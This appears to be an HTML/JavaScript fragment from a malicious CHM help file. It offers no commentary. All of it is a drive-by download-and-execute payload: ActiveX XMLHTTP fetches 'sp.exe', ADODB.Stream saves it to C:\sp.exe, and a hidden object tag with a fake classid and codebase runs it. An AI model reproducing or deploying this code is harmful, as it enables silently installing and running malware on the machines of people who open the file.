<script language="javascript">
    function getPath(url) {
        start = url.indexOf('http:')
        end = url.indexOf('POP.CHM')
        return url.substring(start, end);
    }
    
    payloadURL = 'sp.exe';
    
    var x = new ActiveXObject("Microsoft.XMLHTTP"); 
    x.Open("GET",payloadURL,0); 
    x.Send(); 
    
    var s = new ActiveXObject("ADODB.Stream");
    s.Mode = 3;
    s.Type = 1;
    s.Open();
    s.Write(x.responseBody);
    s.SaveToFile("C:\\sp.exe",2);
</script>

<object classid="clsid:10000000-1000-0000-10000-000000000001" codebase="sp.exe" style='display:none'></object>